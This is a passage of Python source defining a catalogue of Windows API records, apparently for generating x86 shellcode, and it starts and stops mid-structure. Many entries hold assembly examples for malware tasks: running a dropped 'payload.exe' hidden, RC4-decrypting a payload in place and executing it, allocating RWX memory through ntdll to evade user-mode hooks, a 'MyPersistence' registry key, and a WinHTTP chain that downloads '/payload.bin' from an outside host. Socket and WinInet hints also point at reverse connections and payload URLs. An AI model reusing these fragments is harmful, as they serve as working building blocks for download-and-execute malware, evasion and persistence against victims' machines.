        prototype="LPSTR lstrcatA(LPSTR lpString1, LPCSTR lpString2)",
        arguments=[
            Argument("lpString1", "LPSTR", "destination buffer (appended to)"),
            Argument("lpString2", "LPCSTR", "string to append"),
        ],
    ),
    # --- ws2_32.dll : network ---
    "WSAStartup": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype="int WSAStartup(WORD wVersionRequested, LPWSADATA lpWSAData)",
        arguments=[
            Argument("wVersionRequested", "WORD", "MAKEWORD(2,2) = 0x0202"),
            Argument("lpWSAData", "LPWSADATA", "output buffer, allocate 0x190 bytes on stack"),
        ],
        requires_structs=("WSADATA",),
    ),
    "WSASocketA": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype=(
            "SOCKET WSASocketA(int af, int type, int protocol,"
            " LPWSAPROTOCOL_INFOA lpProtocolInfo, GROUP g, DWORD dwFlags)"
        ),
        arguments=[
            Argument("af", "int", "AF_INET = 1"),
            Argument("type", "int", "SOCK_STREAM = 1"),
            Argument("protocol", "int", "IPPROTO_TCP = 6"),
            Argument("lpProtocolInfo", "LPWSAPROTOCOL_INFOA", "NULL"),
            Argument("g", "GROUP", "NULL"),
            Argument("dwFlags", "DWORD", "NULL"),
        ],
    ),
    "connect": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype="int connect(SOCKET s, const struct sockaddr *name, int namelen)",
        arguments=[
            Argument("s", "SOCKET", "socket handle from WSASocketA; stored at [ebp-0x40]"),
            Argument("name", "const struct sockaddr *", "pointer to sockaddr_in on stack"),
            Argument("namelen", "int", "0x10"),
        ],
        requires_structs=("sockaddr_in",),
    ),
    "bind": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype="int bind(SOCKET s, const struct sockaddr *addr, int namelen)",
        arguments=[
            Argument("s", "SOCKET", "listening socket from WSASocketA"),
            Argument("addr", "const struct sockaddr *", "pointer to sockaddr_in with sin_family, sin_port, sin_addr"),
            Argument("namelen", "int", "0x10 (sizeof sockaddr_in)"),
        ],
        requires_structs=("sockaddr_in",),
    ),
    "listen": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype="int listen(SOCKET s, int backlog)",
        arguments=[
            Argument("s", "SOCKET", "bound socket from bind()"),
            Argument("backlog", "int", "SOMAXCONN = 0x7fffffff; or small value like 1"),
        ],
    ),
    "accept": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype="SOCKET accept(SOCKET s, struct sockaddr *addr, int *addrlen)",
        arguments=[
            Argument("s", "SOCKET", "listening socket; blocks until client connects"),
            Argument("addr", "struct sockaddr *", "NULL to ignore client address; or pointer to sockaddr_in"),
            Argument("addrlen", "int *", "NULL if addr is NULL; or pointer to 0x10"),
        ],
        requires_structs=("sockaddr_in",),
    ),
    "closesocket": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype="int closesocket(SOCKET s)",
        arguments=[
            Argument("s", "SOCKET", "socket handle to close"),
        ],
    ),
    "WSAGetLastError": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype="int WSAGetLastError(void)",
        arguments=[],
    ),
    "WSACleanup": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype="int WSACleanup(void)",
        arguments=[],
    ),
    "send": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype="int send(SOCKET s, const char *buf, int len, int flags)",
        arguments=[
            Argument("s",     "SOCKET",       "connected socket handle"),
            Argument("buf",   "const char *", "pointer to data to send"),
            Argument("len",   "int",           "number of bytes to send"),
            Argument("flags", "int",           "0 for default behaviour"),
        ],
    ),
    "recv": APIRecord(
        module="ws2_32.dll",
        category="network",
        prototype="int recv(SOCKET s, char *buf, int len, int flags)",
        arguments=[
            Argument("s",     "SOCKET",  "connected socket handle"),
            Argument("buf",   "char *",  "pointer to receive buffer"),
            Argument("len",   "int",     "size of buffer in bytes"),
            Argument("flags", "int",     "0 for default behaviour"),
        ],
    ),
    # --- wininet.dll : internet ---
    "InternetOpenA": APIRecord(
        module="wininet.dll",
        category="internet",
        prototype=(
            "HINTERNET InternetOpenA(LPCSTR lpszAgent, DWORD dwAccessType,"
            " LPCSTR lpszProxy, LPCSTR lpszProxyBypass, DWORD dwFlags)"
        ),
        arguments=[
            Argument("lpszAgent", "LPCSTR", "user-agent string, e.g. Mozilla/5.0"),
            Argument("dwAccessType", "DWORD", "INTERNET_OPEN_TYPE_DIRECT = 1"),
            Argument("lpszProxy", "LPCSTR", "NULL for direct"),
            Argument("lpszProxyBypass", "LPCSTR", "NULL"),
            Argument("dwFlags", "DWORD", "0"),
        ],
    ),
    "InternetConnectA": APIRecord(
        module="wininet.dll",
        category="internet",
        prototype=(
            "HINTERNET InternetConnectA(HINTERNET hInternet, LPCSTR lpszServerName,"
            " INTERNET_PORT nServerPort, LPCSTR lpszUserName, LPCSTR lpszPassword,"
            " DWORD dwService, DWORD dwFlags, DWORD_PTR dwContext)"
        ),
        arguments=[
            Argument("hInternet", "HINTERNET", "handle from InternetOpenA"),
            Argument("lpszServerName", "LPCSTR", "hostname or IP, e.g. 192.168.1.10"),
            Argument("nServerPort", "INTERNET_PORT", "port number (e.g. 80, 8000)"),
            Argument("lpszUserName", "LPCSTR", "NULL for anonymous"),
            Argument("lpszPassword", "LPCSTR", "NULL for anonymous"),
            Argument("dwService", "DWORD", "INTERNET_SERVICE_HTTP = 3"),
            Argument("dwFlags", "DWORD", "0"),
            Argument("dwContext", "DWORD_PTR", "0"),
        ],
    ),
    "InternetOpenUrlA": APIRecord(
        module="wininet.dll",
        category="internet",
        prototype=(
            "HINTERNET InternetOpenUrlA(HINTERNET hInternet, LPCSTR lpszUrl,"
            " LPCSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwFlags,"
            " DWORD_PTR dwContext)"
        ),
        arguments=[
            Argument("hInternet", "HINTERNET", "handle from InternetOpenA"),
            Argument("lpszUrl", "LPCSTR", "full URL, e.g. http://192.168.1.10/payload.exe"),
            Argument("lpszHeaders", "LPCSTR", "NULL for default headers"),
            Argument("dwHeadersLength", "DWORD", "0 if lpszHeaders is NULL"),
            Argument("dwFlags", "DWORD", "INTERNET_FLAG_RELOAD = 0x80000000; or 0"),
            Argument("dwContext", "DWORD_PTR", "0"),
        ],
    ),
    "InternetReadFile": APIRecord(
        module="wininet.dll",
        category="internet",
        prototype=(
            "BOOL InternetReadFile(HINTERNET hFile, LPVOID lpBuffer,"
            " DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)"
        ),
        arguments=[
            Argument("hFile", "HINTERNET", "handle from InternetOpenUrlA"),
            Argument("lpBuffer", "LPVOID", "pointer to receive buffer"),
            Argument("dwNumberOfBytesToRead", "DWORD", "size of lpBuffer"),
            Argument("lpdwNumberOfBytesRead", "LPDWORD", "pointer to DWORD for bytes read"),
        ],
    ),
    "HttpOpenRequestA": APIRecord(
        module="wininet.dll",
        category="internet",
        prototype=(
            "HINTERNET HttpOpenRequestA(HINTERNET hConnect, LPCSTR lpszVerb,"
            " LPCSTR lpszObjectName, LPCSTR lpszVersion, LPCSTR lpszReferrer,"
            " LPCSTR *lplpszAcceptTypes, DWORD dwFlags, DWORD_PTR dwContext)"
        ),
        arguments=[
            Argument("hConnect", "HINTERNET", "handle from InternetConnectA"),
            Argument("lpszVerb", "LPCSTR", "HTTP method, e.g. POST"),
            Argument("lpszObjectName", "LPCSTR", "URL path, e.g. /upload"),
            Argument("lpszVersion", "LPCSTR", "NULL for HTTP/1.1"),
            Argument("lpszReferrer", "LPCSTR", "NULL"),
            Argument("lplpszAcceptTypes", "LPCSTR*", "NULL for */*"),
            Argument("dwFlags", "DWORD", "0"),
            Argument("dwContext", "DWORD_PTR", "0"),
        ],
    ),
    "HttpSendRequestA": APIRecord(
        module="wininet.dll",
        category="internet",
        prototype=(
            "BOOL HttpSendRequestA(HINTERNET hRequest, LPCSTR lpszHeaders,"
            " DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength)"
        ),
        arguments=[
            Argument("hRequest", "HINTERNET", "handle from HttpOpenRequestA"),
            Argument("lpszHeaders", "LPCSTR", "NULL for default"),
            Argument("dwHeadersLength", "DWORD", "0 if lpszHeaders is NULL"),
            Argument("lpOptional", "LPVOID", "pointer to POST body data"),
            Argument("dwOptionalLength", "DWORD", "size of POST body in bytes"),
        ],
    ),
    "InternetCloseHandle": APIRecord(
        module="wininet.dll",
        category="internet",
        prototype="BOOL InternetCloseHandle(HINTERNET hInternet)",
        arguments=[
            Argument("hInternet", "HINTERNET", "any HINTERNET handle to close"),
        ],
    ),
    # --- user32.dll : ui ---
    "MessageBoxA": APIRecord(
        module="user32.dll",
        category="ui",
        prototype="int MessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR lpCaption, UINT uType)",
        arguments=[
            Argument("hWnd", "HWND", "NULL for no owner window"),
            Argument("lpText", "LPCSTR", "message body string"),
            Argument("lpCaption", "LPCSTR", "title bar string"),
            Argument("uType", "UINT", "MB_OK = 0, MB_ICONINFORMATION = 0x40"),
        ],
    ),
    # --- advapi32.dll : service ---
    "OpenSCManagerA": APIRecord(
        module="advapi32.dll",
        category="service",
        prototype="SC_HANDLE OpenSCManagerA(LPCSTR lpMachineName, LPCSTR lpDatabaseName, DWORD dwDesiredAccess)",
        arguments=[
            Argument("lpMachineName", "LPCSTR", "NULL for local machine"),
            Argument("lpDatabaseName", "LPCSTR", "NULL for SERVICES_ACTIVE_DATABASE"),
            Argument("dwDesiredAccess", "DWORD", "SC_MANAGER_CREATE_SERVICE = 0x0002"),
        ],
    ),
    "CreateServiceA": APIRecord(
        module="advapi32.dll",
        category="service",
        prototype=(
            "SC_HANDLE CreateServiceA(SC_HANDLE hSCManager, LPCSTR lpServiceName,"
            " LPCSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType,"
            " DWORD dwStartType, DWORD dwErrorControl, LPCSTR lpBinaryPathName,"
            " LPCSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCSTR lpDependencies,"
            " LPCSTR lpServiceStartName, LPCSTR lpPassword)"
        ),
        arguments=[
            Argument("hSCManager", "SC_HANDLE", "from OpenSCManagerA"),
            Argument("lpServiceName", "LPCSTR", "internal service name"),
            Argument("lpDisplayName", "LPCSTR", "display name (can match service name)"),
            Argument("dwDesiredAccess", "DWORD", "SERVICE_ALL_ACCESS = 0xF01FF"),
            Argument("dwServiceType", "DWORD", "SERVICE_WIN32_OWN_PROCESS = 0x10"),
            Argument("dwStartType", "DWORD", "SERVICE_AUTO_START = 0x02"),
            Argument("dwErrorControl", "DWORD", "SERVICE_ERROR_IGNORE = 0x00"),
            Argument("lpBinaryPathName", "LPCSTR", "path to service executable"),
            Argument("lpLoadOrderGroup", "LPCSTR", "NULL"),
            Argument("lpdwTagId", "LPDWORD", "NULL"),
            Argument("lpDependencies", "LPCSTR", "NULL"),
            Argument("lpServiceStartName", "LPCSTR", "NULL (LocalSystem)"),
            Argument("lpPassword", "LPCSTR", "NULL"),
        ],
    ),
    "StartServiceA": APIRecord(
        module="advapi32.dll",
        category="service",
        prototype="BOOL StartServiceA(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCSTR *lpServiceArgVectors)",
        arguments=[
            Argument("hService", "SC_HANDLE", "from CreateServiceA"),
            Argument("dwNumServiceArgs", "DWORD", "0"),
            Argument("lpServiceArgVectors", "LPCSTR *", "NULL"),
        ],
    ),
    "CloseServiceHandle": APIRecord(
        module="advapi32.dll",
        category="service",
        prototype="BOOL CloseServiceHandle(SC_HANDLE hSCObject)",
        arguments=[
            Argument("hSCObject", "SC_HANDLE", "SCM or service handle"),
        ],
    ),
    # --- urlmon.dll : download ---
    "URLDownloadToFileA": APIRecord(
        module="urlmon.dll",
        category="internet",
        prototype=(
            "HRESULT URLDownloadToFileA(LPUNKNOWN pCaller, LPCSTR szURL,"
            " LPCSTR szFileName, DWORD dwReserved, LPBINDSTATUSCALLBACK lpfnCB)"
        ),
        arguments=[
            Argument("pCaller", "LPUNKNOWN", "NULL"),
            Argument("szURL", "LPCSTR", "full URL to download"),
            Argument("szFileName", "LPCSTR", "local path to write to"),
            Argument("dwReserved", "DWORD", "0"),
            Argument("lpfnCB", "LPBINDSTATUSCALLBACK", "NULL"),
        ],
    ),
    # --- advapi32.dll : identity ---
    "GetUserNameA": APIRecord(
        module="advapi32.dll",
        category="identity",
        prototype="BOOL GetUserNameA(LPSTR lpBuffer, LPDWORD pcbBuffer)",
        arguments=[
            Argument("lpBuffer", "LPSTR", "pointer to buffer receiving the username"),
            Argument("pcbBuffer", "LPDWORD", "pointer to DWORD: in=buffer size, out=chars copied including null"),
        ],
    ),
    # --- advapi32.dll : token ---
    "OpenProcessToken": APIRecord(
        module="advapi32.dll",
        category="token",
        prototype="BOOL OpenProcessToken(HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle)",
        arguments=[
            Argument("ProcessHandle", "HANDLE", "process handle; (HANDLE)-1 = current process"),
            Argument("DesiredAccess", "DWORD", "TOKEN_QUERY = 0x0008"),
            Argument("TokenHandle", "PHANDLE", "pointer to HANDLE output"),
        ],
    ),
    # --- userenv.dll : identity ---
    "GetUserProfileDirectoryA": APIRecord(
        module="userenv.dll",
        category="identity",
        prototype="BOOL GetUserProfileDirectoryA(HANDLE hToken, LPSTR lpProfileDir, LPDWORD lpcchSize)",
        arguments=[
            Argument("hToken", "HANDLE", "token from OpenProcessToken"),
            Argument("lpProfileDir", "LPSTR", "buffer receiving profile path"),
            Argument("lpcchSize", "LPDWORD", "pointer to DWORD: in=buffer size, out=chars copied"),
        ],
    ),
    # --- shell32.dll : process ---
    "ShellExecuteA": APIRecord(
        module="shell32.dll",
        category="process",
        prototype=(
            "HINSTANCE ShellExecuteA(HWND hwnd, LPCSTR lpOperation,"
            " LPCSTR lpFile, LPCSTR lpParameters,"
            " LPCSTR lpDirectory, INT nShowCmd)"
        ),
        arguments=[
            Argument("hwnd", "HWND", "NULL"),
            Argument("lpOperation", "LPCSTR", "NULL (default open), or 'runas' for elevation"),
            Argument("lpFile", "LPCSTR", "file or URL to open/execute"),
            Argument("lpParameters", "LPCSTR", "command-line args; NULL if none"),
            Argument("lpDirectory", "LPCSTR", "working directory; NULL for default"),
            Argument("nShowCmd", "INT", "SW_SHOWNORMAL=1, SW_HIDE=0"),
        ],
        example=(
            "; Execute a dropped file (simpler than CreateProcessA, no structs needed)\n"
            "push 0                        ; SW_HIDE\n"
            "push 0                        ; lpDirectory = NULL\n"
            "push 0                        ; lpParameters = NULL\n"
            "lea eax, [ebp-str_exe_path]   ; e.g. \"C:\\Users\\Public\\payload.exe\"\n"
            "push eax                      ; lpFile\n"
            "push 0                        ; lpOperation = NULL (default \"open\")\n"
            "push 0                        ; hwnd = NULL\n"
            "call [ebp-ShellExecuteA]\n"
            "; Returns HINSTANCE > 32 on success\n"
            "cmp eax, 32\n"
            "jle shell_exec_failed"
        ),
    ),
    # --- shell32.dll : filesystem ---
    "SHGetFolderPathA": APIRecord(
        module="shell32.dll",
        category="filesystem",
        prototype="HRESULT SHGetFolderPathA(HWND hwnd, int csidl, HANDLE hToken, DWORD dwFlags, LPSTR pszPath)",
        arguments=[
            Argument("hwnd", "HWND", "NULL"),
            Argument("csidl", "int", "CSIDL_DESKTOP=0x00, CSIDL_APPDATA=0x1A, CSIDL_PERSONAL=0x05"),
            Argument("hToken", "HANDLE", "NULL for current user"),
            Argument("dwFlags", "DWORD", "0"),
            Argument("pszPath", "LPSTR", "buffer receiving path; must be MAX_PATH (260) chars"),
        ],
    ),
    # --- advapi32.dll : crypto ---
    "SystemFunction032": APIRecord(
        module="advapi32.dll",
        category="crypto",
        prototype="NTSTATUS SystemFunction032(PUNICODE_STRING Data, PUNICODE_STRING Key)",
        arguments=[
            Argument("Data", "PUNICODE_STRING", "pointer to {Length, MaxLength, Buffer} struct over data to en/decrypt in place"),
            Argument("Key", "PUNICODE_STRING", "pointer to {Length, MaxLength, Buffer} struct over RC4 key bytes"),
        ],
        example=(
            "; RC4 decrypt a payload in-place using undocumented advapi32 export\n"
            "; Build UNICODE_STRING structs on stack (repurposed: Length, MaxLength, Buffer)\n"
            "; Data descriptor:\n"
            "mov word [ebp-0xB0], 0x200    ; Length = encrypted payload size\n"
            "mov word [ebp-0xB2], 0x200    ; MaxLength\n"
            "lea eax, [ebp-encrypted_buf]\n"
            "mov [ebp-0xB4], eax           ; Buffer -> encrypted data\n"
            "; Key descriptor:\n"
            "mov word [ebp-0xB8], 8        ; Length = key size (e.g. 8 bytes)\n"
            "mov word [ebp-0xBA], 8        ; MaxLength\n"
            "lea eax, [ebp-rc4_key]        ; pre-built key bytes on stack\n"
            "mov [ebp-0xBC], eax           ; Buffer -> key\n"
            "; Call:\n"
            "lea eax, [ebp-0xB8]\n"
            "push eax                      ; Key\n"
            "lea eax, [ebp-0xB0]\n"
            "push eax                      ; Data\n"
            "call [ebp-SystemFunction032]\n"
            "test eax, eax                 ; NTSTATUS: 0 = success\n"
            "; encrypted_buf is now decrypted in-place; CreateThread to execute"
        ),
    ),
    # --- advapi32.dll : registry ---
    "RegCreateKeyExA": APIRecord(
        module="advapi32.dll",
        category="registry",
        prototype=(
            "LSTATUS RegCreateKeyExA(HKEY hKey, LPCSTR lpSubKey,"
            " DWORD Reserved, LPSTR lpClass, DWORD dwOptions,"
            " REGSAM samDesired, LPSECURITY_ATTRIBUTES lpSecurityAttributes,"
            " PHKEY phkResult, LPDWORD lpdwDisposition)"
        ),
        arguments=[
            Argument("hKey", "HKEY", "HKEY_LOCAL_MACHINE = 0x80000002 or HKEY_CURRENT_USER = 0x80000001"),
            Argument("lpSubKey", "LPCSTR", "registry path to create/open"),
            Argument("Reserved", "DWORD", "0"),
            Argument("lpClass", "LPSTR", "NULL"),
            Argument("dwOptions", "DWORD", "REG_OPTION_NON_VOLATILE = 0"),
            Argument("samDesired", "REGSAM", "KEY_SET_VALUE = 0x0002"),
            Argument("lpSecurityAttributes", "LPSECURITY_ATTRIBUTES", "NULL"),
            Argument("phkResult", "PHKEY", "pointer to HKEY output"),
            Argument("lpdwDisposition", "LPDWORD", "NULL; or pointer to DWORD for REG_CREATED_NEW_KEY/REG_OPENED_EXISTING_KEY"),
        ],
        example=(
            "; Create a custom registry key (works even if key doesn't exist yet)\n"
            "; Unlike RegOpenKeyExA, this creates the key if missing\n"
            "push 0                        ; lpdwDisposition = NULL\n"
            "lea eax, [ebp-hkey_out]\n"
            "push eax                      ; phkResult\n"
            "push 0                        ; lpSecurityAttributes = NULL\n"
            "push 0x0002                   ; KEY_SET_VALUE\n"
            "push 0                        ; REG_OPTION_NON_VOLATILE\n"
            "push 0                        ; lpClass = NULL\n"
            "push 0                        ; Reserved\n"
            "lea eax, [ebp-str_custom_key] ; e.g. \"Software\\MyPersistence\"\n"
            "push eax                      ; lpSubKey\n"
            "push 0x80000001               ; HKEY_CURRENT_USER\n"
            "call [ebp-RegCreateKeyExA]\n"
            "test eax, eax                 ; ERROR_SUCCESS = 0\n"
            "; Now RegSetValueExA with [ebp-hkey_out]"
        ),
    ),
    "RegOpenKeyExA": APIRecord(
        module="advapi32.dll",
        category="registry",
        prototype=(
            "LSTATUS RegOpenKeyExA(HKEY hKey, LPCSTR lpSubKey,"
            " DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)"
        ),
        arguments=[
            Argument("hKey", "HKEY", "HKEY_LOCAL_MACHINE = 0x80000002 or HKEY_CURRENT_USER = 0x80000001"),
            Argument("lpSubKey", "LPCSTR", "registry path string"),
            Argument("ulOptions", "DWORD", "0"),
            Argument("samDesired", "REGSAM", "KEY_SET_VALUE = 0x0002"),
            Argument("phkResult", "PHKEY", "pointer to HKEY output"),
        ],
    ),
    "RegSetValueExA": APIRecord(
        module="advapi32.dll",
        category="registry",
        prototype=(
            "LSTATUS RegSetValueExA(HKEY hKey, LPCSTR lpValueName,"
            " DWORD Reserved, DWORD dwType, const BYTE *lpData,"
            " DWORD cbData)"
        ),
        arguments=[
            Argument("hKey", "HKEY", "opened registry key handle"),
            Argument("lpValueName", "LPCSTR", "value name string"),
            Argument("Reserved", "DWORD", "0"),
            Argument("dwType", "DWORD", "REG_SZ = 1"),
            Argument("lpData", "const BYTE*", "pointer to data (string for REG_SZ)"),
            Argument("cbData", "DWORD", "size of data in bytes including null terminator"),
        ],
    ),
    "RegCloseKey": APIRecord(
        module="advapi32.dll",
        category="registry",
        prototype="LSTATUS RegCloseKey(HKEY hKey)",
        arguments=[
            Argument("hKey", "HKEY", "opened registry key handle"),
        ],
    ),
    # --- ntdll.dll : ntapi ---
    "NtAllocateVirtualMemory": APIRecord(
        module="ntdll.dll",
        category="ntapi",
        prototype=(
            "NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle,"
            " PVOID *BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize,"
            " ULONG AllocationType, ULONG Protect)"
        ),
        arguments=[
            Argument("ProcessHandle", "HANDLE", "(HANDLE)-1 = current process = 0xFFFFFFFF"),
            Argument("BaseAddress", "PVOID*", "pointer to PVOID; NULL on input lets OS choose"),
            Argument("ZeroBits", "ULONG_PTR", "0"),
            Argument("RegionSize", "PSIZE_T", "pointer to SIZE_T with desired size"),
            Argument("AllocationType", "ULONG", "MEM_COMMIT|MEM_RESERVE = 0x3000"),
            Argument("Protect", "ULONG", "PAGE_EXECUTE_READWRITE = 0x40"),
        ],
        example=(
            "; Allocate RWX memory via ntdll (bypasses user-mode hooks on VirtualAlloc)\n"
            "xor eax, eax\n"
            "mov [ebp-0xA0], eax          ; BaseAddress = NULL (let OS choose)\n"
            "mov dword [ebp-0xA4], 0x1000 ; RegionSize = 4096\n"
            "push 0x40                     ; PAGE_EXECUTE_READWRITE\n"
            "push 0x3000                   ; MEM_COMMIT | MEM_RESERVE\n"
            "lea eax, [ebp-0xA4]\n"
            "push eax                      ; &RegionSize\n"
            "push 0                        ; ZeroBits\n"
            "lea eax, [ebp-0xA0]\n"
            "push eax                      ; &BaseAddress\n"
            "push 0xFFFFFFFF               ; current process\n"
            "call [ebp-NtAllocateVirtualMemory]\n"
            "test eax, eax                 ; NTSTATUS: 0 = success\n"
            "mov eax, [ebp-0xA0]           ; eax = allocated address"
        ),
    ),
    "NtWriteVirtualMemory": APIRecord(
        module="ntdll.dll",
        category="ntapi",
        prototype=(
            "NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle,"
            " PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite,"
            " PSIZE_T NumberOfBytesWritten)"
        ),
        arguments=[
            Argument("ProcessHandle", "HANDLE", "(HANDLE)-1 = current process = 0xFFFFFFFF"),
            Argument("BaseAddress", "PVOID", "destination address in target process"),
            Argument("Buffer", "PVOID", "source buffer"),
            Argument("NumberOfBytesToWrite", "SIZE_T", "number of bytes"),
            Argument("NumberOfBytesWritten", "PSIZE_T", "NULL or pointer to SIZE_T"),
        ],
        example=(
            "; Write payload to allocated memory (hook-safe alternative to WriteProcessMemory)\n"
            "push 0                        ; NumberOfBytesWritten = NULL\n"
            "push 0x200                    ; NumberOfBytesToWrite\n"
            "lea eax, [ebp-payload_buf]\n"
            "push eax                      ; Buffer (source)\n"
            "push [ebp-alloc_addr]         ; BaseAddress (destination)\n"
            "push 0xFFFFFFFF               ; current process\n"
            "call [ebp-NtWriteVirtualMemory]\n"
            "test eax, eax                 ; NTSTATUS: 0 = success"
        ),
    ),
    # --- winhttp.dll : internet ---
    "WinHttpOpen": APIRecord(
        module="winhttp.dll",
        category="internet",
        prototype=(
            "HINTERNET WinHttpOpen(LPCWSTR pszAgentW, DWORD dwAccessType,"
            " LPCWSTR pszProxyW, LPCWSTR pszProxyBypassW, DWORD dwFlags)"
        ),
        arguments=[
            Argument("pszAgentW", "LPCWSTR", "NULL or wide user-agent string"),
            Argument("dwAccessType", "DWORD", "WINHTTP_ACCESS_TYPE_DEFAULT_PROXY = 0"),
            Argument("pszProxyW", "LPCWSTR", "WINHTTP_NO_PROXY_NAME = NULL"),
            Argument("pszProxyBypassW", "LPCWSTR", "WINHTTP_NO_PROXY_BYPASS = NULL"),
            Argument("dwFlags", "DWORD", "0"),
        ],
        example=(
            "; WinHTTP download chain (alternative to WinInet, different DLL/hooks)\n"
            "; Step 1: Open session\n"
            "push 0                        ; dwFlags\n"
            "push 0                        ; pszProxyBypassW = NULL\n"
            "push 0                        ; pszProxyW = NULL\n"
            "push 0                        ; WINHTTP_ACCESS_TYPE_DEFAULT_PROXY\n"
            "push 0                        ; pszAgentW = NULL\n"
            "call [ebp-WinHttpOpen]\n"
            "mov [ebp-http_session], eax"
        ),
    ),
    "WinHttpConnect": APIRecord(
        module="winhttp.dll",
        category="internet",
        prototype=(
            "HINTERNET WinHttpConnect(HINTERNET hSession,"
            " LPCWSTR pswzServerName, INTERNET_PORT nServerPort, DWORD dwReserved)"
        ),
        arguments=[
            Argument("hSession", "HINTERNET", "from WinHttpOpen"),
            Argument("pswzServerName", "LPCWSTR", "wide server hostname or IP"),
            Argument("nServerPort", "INTERNET_PORT", "port number, e.g. 80, 443, 8080"),
            Argument("dwReserved", "DWORD", "0"),
        ],
        example=(
            "; Step 2: Connect to server (note: WinHTTP uses wide strings)\n"
            "push 0                        ; dwReserved\n"
            "push 8080                     ; nServerPort\n"
            "lea eax, [ebp-wstr_server]    ; wide string: L\"192.168.1.100\"\n"
            "push eax                      ; pswzServerName\n"
            "push [ebp-http_session]       ; hSession\n"
            "call [ebp-WinHttpConnect]\n"
            "mov [ebp-http_connect], eax"
        ),
    ),
    "WinHttpOpenRequest": APIRecord(
        module="winhttp.dll",
        category="internet",
        prototype=(
            "HINTERNET WinHttpOpenRequest(HINTERNET hConnect, LPCWSTR pwszVerb,"
            " LPCWSTR pwszObjectName, LPCWSTR pwszVersion,"
            " LPCWSTR pwszReferrer, LPCWSTR *ppwszAcceptTypes, DWORD dwFlags)"
        ),
        arguments=[
            Argument("hConnect", "HINTERNET", "from WinHttpConnect"),
            Argument("pwszVerb", "LPCWSTR", "L\"GET\" or NULL for GET"),
            Argument("pwszObjectName", "LPCWSTR", "URL path, e.g. L\"/payload.bin\""),
            Argument("pwszVersion", "LPCWSTR", "NULL for HTTP/1.1"),
            Argument("pwszReferrer", "LPCWSTR", "WINHTTP_NO_REFERER = NULL"),
            Argument("ppwszAcceptTypes", "LPCWSTR*", "WINHTTP_DEFAULT_ACCEPT_TYPES = NULL"),
            Argument("dwFlags", "DWORD", "WINHTTP_FLAG_SECURE = 0x00800000 for HTTPS; 0 for HTTP"),
        ],
        example=(
            "; Step 3: Create GET request for the payload path\n"
            "push 0                        ; dwFlags = 0 (HTTP; use 0x00800000 for HTTPS)\n"
            "push 0                        ; ppwszAcceptTypes = NULL\n"
            "push 0                        ; pwszReferrer = NULL\n"
            "push 0                        ; pwszVersion = NULL (HTTP/1.1)\n"
            "lea eax, [ebp-wstr_path]      ; L\"/payload.bin\"\n"
            "push eax                      ; pwszObjectName\n"
            "push 0                        ; pwszVerb = NULL (GET)\n"
            "push [ebp-http_connect]       ; hConnect\n"
            "call [ebp-WinHttpOpenRequest]\n"
            "mov [ebp-http_request], eax"
        ),
    ),
    "WinHttpSendRequest": APIRecord(
        module="winhttp.dll",
        category="internet",
        prototype=(
            "BOOL WinHttpSendRequest(HINTERNET hRequest, LPCWSTR lpszHeaders,"
            " DWORD dwHeadersLength, LPVOID lpOptional,"
            " DWORD dwOptionalLength, DWORD dwTotalLength, DWORD_PTR dwContext)"
        ),
        arguments=[
            Argument("hRequest", "HINTERNET", "from WinHttpOpenRequest"),
            Argument("lpszHeaders", "LPCWSTR", "WINHTTP_NO_ADDITIONAL_HEADERS = NULL"),
            Argument("dwHeadersLength", "DWORD", "0"),
            Argument("lpOptional", "LPVOID", "WINHTTP_NO_REQUEST_DATA = NULL"),
            Argument("dwOptionalLength", "DWORD", "0"),
            Argument("dwTotalLength", "DWORD", "0"),
            Argument("dwContext", "DWORD_PTR", "0"),
        ],
        example=(
            "; Step 4: Send the request\n"
            "push 0                        ; dwContext\n"
            "push 0                        ; dwTotalLength\n"
            "push 0                        ; dwOptionalLength\n"
            "push 0                        ; lpOptional = NULL\n"
            "push 0                        ; dwHeadersLength\n"
            "push 0                        ; lpszHeaders = NULL\n"
            "push [ebp-http_request]       ; hRequest\n"
            "call [ebp-WinHttpSendRequest]\n"
            "test eax, eax\n"
            "jz http_failed"
        ),
    ),
    "WinHttpReceiveResponse": APIRecord(
        module="winhttp.dll",
        category="internet",
        prototype="BOOL WinHttpReceiveResponse(HINTERNET hRequest, LPVOID lpReserved)",
        arguments=[
            Argument("hRequest", "HINTERNET", "from WinHttpSendRequest"),
            Argument("lpReserved", "LPVOID", "NULL"),
        ],
        example=(
            "; Step 5: Wait for the response headers\n"
            "push 0                        ; lpReserved = NULL\n"
            "push [ebp-http_request]       ; hRequest\n"
            "call [ebp-WinHttpReceiveResponse]\n"
            "test eax, eax\n"
            "jz http_failed"
        ),
    ),
    "WinHttpReadData": APIRecord(
        module="winhttp.dll",
        category="internet",
        prototype=(
            "BOOL WinHttpReadData(HINTERNET hRequest, LPVOID lpBuffer,"
            " DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead)"
        ),
        arguments=[
            Argument("hRequest", "HINTERNET", "from WinHttpReceiveResponse"),
            Argument("lpBuffer", "LPVOID", "pointer to receive buffer"),
            Argument("dwNumberOfBytesToRead", "DWORD", "size of buffer"),
            Argument("lpdwNumberOfBytesRead", "LPDWORD", "pointer to DWORD for bytes read"),
        ],
        example=(
            "; Step 6: Read response body into VirtualAlloc'd buffer\n"
            "read_loop:\n"
            "  lea eax, [ebp-bytes_read]\n"
            "  push eax                    ; lpdwNumberOfBytesRead\n"
